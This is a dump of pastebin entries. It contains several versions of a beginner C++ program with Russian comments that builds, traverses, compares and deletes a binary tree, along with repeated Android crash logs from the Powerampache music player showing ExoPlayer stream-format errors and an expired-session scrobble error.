    // Создает поддерево
    node* create_subtree(node* par, int Li, int Ri, const vector <int> &arr) {
        if (Li > Ri) return nullptr; // Проверка на правильные границы

        node* root = new node(par);
        root->val = arr[(Ri + Li) / 2]; // устанавливаем значение корня

        // Создание левого и правого поддеревьев
        root->l = create_subtree(root, Li, (Ri + Li) / 2 - 1, arr);
        root->r = create_subtree(root, (Ri + Li) / 2 + 1, Ri, arr);

        return root; // Возвращаем указатель на созданный узел
    }

    // Инициализация дерева
    void create(const vector <int> &arr) {
        cur_size = arr.size();
        if (arr.size() == 0) {
            main_root = nullptr; // В случае пустого массива
        } else {
            main_root = create_subtree(nullptr, 0, arr.size() - 1, arr);
        }
        cout << ""Tree created\n"";
    }

    // Обход дерева (in-order)
    void trav(node* root) {
        if (root == nullptr) return; // Проверка на nullptr
        trav(root->l); // Обход левого поддерева
        cout << root->val << "" ""; // Обработка текущего узла
        trav(root->r); // Обход правого поддерева
    }

    void replace_el(node* root, int Li, int Ri, int i, int x) {
        if (root == nullptr) return;

        int mid = (Li + Ri) / 2;
        if (i == mid) {  // Нашли узел, который нужно заменить
            root->val = x;
            return;
        }

        if (i < mid) {
            replace_el(root->l, Li, mid - 1, i, x);  // Ищем в левом поддереве
        } else {
            replace_el(root->r, mid + 1, Ri, i, x);  // Ищем в правом поддереве
        }
    }

    void del(node* &root) {
        if (root == nullptr) {
            return;
        }
        del(root->l);
        del(root->r);
        if (root->l == nullptr && root->r == nullptr) {
            cout << ""clidren already nullptr\n"";
        }
        cout << ""del:"" << root->val << ""\n"";
        delete root;
        root = nullptr;
        if (root == nullptr) {
            cout << ""successfully deleted\n"";
            cout << ""\n"";
        }
    }
};

bool cmp(node* root1, node* root2) {
     if  (root1 == nullptr) {
        if (root2 != nullptr) {
            return 0;
        }
        return 1;
     }  else if(root2 == nullptr){
         if (root1 != nullptr) {
            return 0;
         }
         return 1;
     }
     if (root1->val != root2->val) {
        return 0;
     }
     bool L = cmp(root1->l, root2->l);
     bool R = cmp(root1->r, root2->r);
     return L & R;
}


bool cmp_tree(tree T1, tree T2) {
    bool ans = cmp(T1.main_root, T2.main_root);
    return ans;
}

int main() {
    /*cin.tie(0);
    cout.tie(0);
    ios::sync_with_stdio(false);*/
    tree T1, T2;
    //vector<int> a = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21};
    vector<int> a = {1, 2, 3, 4, 5, 6, 7, 8};
    //vector<int> b = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20};
    T1.create(a);
    T1.trav(T1.main_root); cout << ""\n"";
    //T2.create(b);
    //bool ans = cmp_tree(T1, T2);
    //cout << ans << ""\n"";
    T1.del(T1.main_root);
    cout  << T1.main_root << ""\n"";
    if (T1.main_root == nullptr) {
        cout << ""ok\n"";
    }
    // Освобождение памяти
    // Здесь может быть реализована функция для удаления дерева и освобождения памяти
    return 0;
}
"
zVpe44zf,2025-04-19T14:03:08.619707,powerampache,PHP,Saturday 19th of April 2025 04:03:09 AM CDT,"1.01-80 (80) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:864)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:834)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1124)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:453)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":19},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":300531599,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d5508f0980f3772d69bb897d32df05427\u0026type\u003dsong\u0026id\u003d8241"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1124,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":864,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":834,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
zRh3kecj,2025-04-19T14:03:08.261263,powerampache,PHP,Saturday 19th of April 2025 04:03:08 AM CDT,"1.01-80 (80) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.ScrobbleException: {""errorAction"":""record_play"",""errorCode"":""4701"",""errorMessage"":""Session Expired"",""errorType"":""account""}
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.scrobbleApiCall(SongsRepositoryImpl.kt:660)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.access$scrobbleApiCall(SongsRepositoryImpl.kt:80)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl$scrobbleApiCall$1.invokeSuspend(Unknown Source:15)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:942)
	at android.os.Handler.dispatchMessage(Handler.java:99)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.app.ActivityThread.main(ActivityThread.java:7983)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:548)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:860)

scrobble() - "
Cv3kfQq2,2025-04-19T14:03:08.485385,powerampache,PHP,Saturday 19th of April 2025 04:03:08 AM CDT,"1.01-80 (80) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:864)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:834)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1124)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:453)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":19},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":300531418,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d5508f0980f3772d69bb897d32df05427\u0026type\u003dsong\u0026id\u003d8241"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1124,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":864,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":834,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
LiJrPKLY,2025-04-19T14:03:08.291499,powerampache,PHP,Saturday 19th of April 2025 04:03:08 AM CDT,"1.01-80 (80) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:864)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:834)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1124)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:453)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":19},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":300531151,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d5508f0980f3772d69bb897d32df05427\u0026type\u003dsong\u0026id\u003d8241"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1124,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":864,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":834,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
pt0b9Pqc,2025-04-19T14:03:08.023557,powerampache,PHP,Saturday 19th of April 2025 04:03:08 AM CDT,"1.01-80 (80) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:864)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:834)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1124)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:453)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":19},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":300530987,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d5508f0980f3772d69bb897d32df05427\u0026type\u003dsong\u0026id\u003d8241"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1124,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":864,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":834,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
R6BwEeS6,tree5,Korotkodul,C++,Saturday 19th of April 2025 03:58:31 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

const int inf = 2e9;

struct node {
    node* parent;
    node* l;
    node* r;
    int val;

    node(node* par) : parent(par), l(nullptr), r(nullptr), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), val(inf) {}
};

struct tree {
    //vector<int> arr; // используется ТОЛЬКО для инициализации дерева
    node* main_root; // Изменен на указатель для удобства
    int cur_size = 0;

    // Создает поддерево
    node* create_subtree(node* par, int Li, int Ri, const vector <int> &arr) {
        if (Li > Ri) return nullptr; // Проверка на правильные границы

        node* root = new node(par);
        root->val = arr[(Ri + Li) / 2]; // устанавливаем значение корня

        // Создание левого и правого поддеревьев
        root->l = create_subtree(root, Li, (Ri + Li) / 2 - 1, arr);
        root->r = create_subtree(root, (Ri + Li) / 2 + 1, Ri, arr);

        return root; // Возвращаем указатель на созданный узел
    }

    // Инициализация дерева
    void create(const vector <int> &arr) {
        cur_size = arr.size();
        if (arr.size() == 0) {
            main_root = nullptr; // В случае пустого массива
        } else {
            main_root = create_subtree(nullptr, 0, arr.size() - 1, arr);
        }
        cout << ""Tree created\n"";
    }

    // Обход дерева (in-order)
    void trav(node* root) {
        if (root == nullptr) return; // Проверка на nullptr
        trav(root->l); // Обход левого поддерева
        cout << root->val << "" ""; // Обработка текущего узла
        trav(root->r); // Обход правого поддерева
    }

    void replace_el(node* root, int Li, int Ri, int i, int x) {
        if (root == nullptr) return;

        int mid = (Li + Ri) / 2;
        if (i == mid) {  // Нашли узел, который нужно заменить
            root->val = x;
            return;
        }

        if (i < mid) {
            replace_el(root->l, Li, mid - 1, i, x);  // Ищем в левом поддереве
        } else {
            replace_el(root->r, mid + 1, Ri, i, x);  // Ищем в правом поддереве
        }
    }
};

bool cmp(node* root1, node* root2) {
     if  (root1 == nullptr) {
        if (root2 != nullptr) {
            return 0;
        }
        return 1;
     }  else if(root2 == nullptr){
         if (root1 != nullptr) {
            return 0;
         }
         return 1;
     }
     if (root1->val != root2->val) {
        return 0;
     }
     bool L = cmp(root1->l, root2->l);
     bool R = cmp(root1->r, root2->r);
     return L & R;
}



bool cmp_tree(tree T1, tree T2) {
    bool ans = cmp(T1.main_root, T2.main_root);
    return ans;
}

int main() {
    tree T1, T2;
    vector<int> a = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21};
    vector<int> b = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20};
    T1.create(a);
    T2.create(b);
    bool ans = cmp_tree(T1, T2);
    cout << ans << ""\n"";

    // Освобождение памяти
    // Здесь может быть реализована функция для удаления дерева и освобождения памяти
    return 0;
}
"
235txnXr,tree4,Korotkodul,C++,Saturday 19th of April 2025 03:38:35 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

const int inf = 2e9;

struct node {
    node* parent;
    node* l;
